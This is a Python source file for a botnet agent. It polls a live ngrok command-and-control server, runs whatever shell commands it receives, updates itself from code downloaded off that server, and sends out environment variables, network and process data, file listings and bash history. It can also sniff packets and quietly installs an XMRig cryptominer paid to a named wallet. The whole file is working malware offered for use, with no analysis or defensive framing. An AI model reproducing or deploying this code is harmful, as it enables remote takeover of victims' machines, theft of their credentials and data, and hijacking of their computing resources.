import sys
import time
import subprocess
import os
import threading
import json
import socket

try:
    from urllib.request import urlopen, Request, urlretrieve
except ImportError:
    from urllib2 import urlopen, Request
    from urllib import urlretrieve

C2_URL_BASE = "https://patchy-zirconic-tanna.ngrok-free.dev"
VERSION = "1.3"
PAYLOAD_NAME = "jVC.py"
INSTALL_PATH = os.path.expanduser("~/.local/share/system-service.py")

class Bot:
    def __init__(self):
        self.interval = 10
        self.last_beat = 0
        self.last_cmd = ""
        self.bot_id = self.get_bot_id()

    def get_bot_id(self):
        try:
            return socket.gethostname() + "_" + os.environ.get("USER", "unknown")
        except:
            return "unknown_bot"

    def get_output(self, cmd):
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            return (out + err).decode('utf-8', errors='ignore').strip()
        except Exception as e:
            return str(e)

    def send_result(self, output):
        try:
            data = output.encode("utf-8")
            req = Request(C2_URL_BASE + "/result", data=data)
            req.add_header("Content-Length", str(len(data)))
            req.add_header("ngrok-skip-browser-warning", "true")
            req.add_header("User-Agent", "botnet-agent-v1.2")
            urlopen(req).read()
        except Exception as e:
            pass

    def get_command(self):
        try:
            req = Request(C2_URL_BASE + "/cmd")
            req.add_header("X-Bot-ID", self.bot_id)
            req.add_header("ngrok-skip-browser-warning", "true")
            req.add_header("User-Agent", "botnet-agent-v1.2")
            return urlopen(req).read().decode("utf-8").strip()
        except:
            return ""

    def update(self):
        try:
            self.send_result("Checking for updates...")
            # Check version
            req = Request(C2_URL_BASE + "/version")
            req.add_header("ngrok-skip-browser-warning", "true")
            req.add_header("User-Agent", "botnet-agent-v1.2")
            current_v = json.loads(urlopen(req).read().decode())["version"]
            if current_v != VERSION:
                self.send_result(f"Updating from {VERSION} to {current_v}...")
                url = f"{C2_URL_BASE}/payload"
                # Need custom request for payload download too
                req_dl = Request(url)
                req_dl.add_header("ngrok-skip-browser-warning", "true")
                req_dl.add_header("User-Agent", "botnet-agent-v1.2")
                
                with urlopen(req_dl) as response, open(sys.argv[0], 'wb') as out_file:
                    out_file.write(response.read())
                self.send_result("Update downloaded. Restarting...")
                os.execv(sys.executable, ['python3'] + sys.argv)
            else:
                self.send_result("Already up to date.")
        except Exception as e:
            self.send_result(f"Update failed: {e}")

    def spider(self):
        try:
             # Check for module
            sys.path.append(os.path.dirname(os.path.abspath(__file__)))
            try:
                from modules.spider import Spider
                Spider(self).run()
            except ImportError:
                # Fallback
                info = {}
                info["env"] = dict(os.environ)
                info["interfaces"] = self.get_output("ip addr")
                info["neighbors"] = self.get_output("ip neigh")
                info["connections"] = self.get_output("netstat -antp")
                info["files_home"] = self.get_output("ls -R ~ | head -n 50")
                info["process_list"] = self.get_output("ps aux --sort=-%mem | head -n 20")
                
                self.send_result(f"SPIDER_DATA:\n{json.dumps(info, indent=2)}")
        except Exception as e:
            self.send_result(f"Spider failed: {e}")

    def sniff(self, duration=30):
        # Requires Root
        self.send_result(f"Starting Packet Sniffer for {duration}s...")
        try:
            sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            start = time.time()
            captured = []
            while time.time() - start < duration:
                recv_data = sniffer_socket.recv(2048)
                captured.append(repr(recv_data[:50])) # Just cap header for now
            
            self.send_result(f"SNIFFER: Captured {len(captured)} packets.\n" + "\n".join(captured[:20]))
        except PermissionError:
             self.send_result("SNIFFER: Permission Denied (Requires Root)")
        except Exception as e:
             self.send_result(f"SNIFFER: Error {e}")

    def keylog(self):
        # Headless "Keylogger" -> Shell History Monitor
        self.send_result("Starting Shell History Monitor (Passive Keylog)...")
        try:
            # Check for module
            sys.path.append(os.path.dirname(os.path.abspath(__file__)))
            try:
                from modules.keylogger import Keylogger
                if not hasattr(self, 'keylogger_module'):
                    self.keylogger_module = Keylogger(self)
                self.keylogger_module.start()
            except ImportError:
                 # Fallback
                hist_file = os.path.expanduser("~/.bash_history")
                if os.path.exists(hist_file):
                    initial = self.get_output(f"tail -n 20 {hist_file}")
                    self.send_result(f"HISTORY_INITIAL:\n{initial}")
                else:
                    self.send_result("No .bash_history found.")
        except Exception as e:
            self.send_result(f"Keylog failed: {e}")

    def run_mining(self):
        if not os.path.exists("/tmp/xmrig"):
             self.get_output("wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz")
             self.get_output("tar xf /tmp/xmrig.tar.gz -C /tmp --strip-components=1")
        
        cmd = "/tmp/xmrig -o rx.unmineable.com:3333 -u SOL:7Ddqht4FUrysBok4Fe8xYa9Ua1EwoB8TehsRSWUmXK5w.Bot_v1_2 -p x -k -B > /dev/null 2>&1 &"
        subprocess.Popen(cmd, shell=True)
        self.send_result("Mining started.")

    def process_command(self, cmd):
        if cmd == "update": self.update()
        elif cmd == "spider": self.spider()
        elif cmd == "sniff": self.sniff()
        elif cmd == "keylog": self.keylog()
        elif cmd == "mine": self.run_mining()
        else:
            out = self.get_output(cmd)
            self.send_result(f"CMD_EXEC: {cmd}\n{out}")

    def run(self):
        self.send_result(f"AGENT_START_v{VERSION}")
        while True:
            try:
                # Heartbeat
                data = json.dumps({"hostname": self.bot_id, "version": VERSION})
                req = Request(C2_URL_BASE + "/heartbeat", data=data.encode("utf-8"))
                req.add_header("Content-Type", "application/json")
                req.add_header("Content-Length", str(len(data)))
                req.add_header("ngrok-skip-browser-warning", "true")
                req.add_header("User-Agent", "botnet-agent-v1.2")
                urlopen(req).read()

                # Command
                cmd = self.get_command()
                if cmd and cmd != self.last_cmd:
                    self.last_cmd = cmd
                    self.process_command(cmd)

                time.sleep(self.interval)
            except Exception as e:
                time.sleep(10)

if __name__ == "__main__":
    Bot().run()
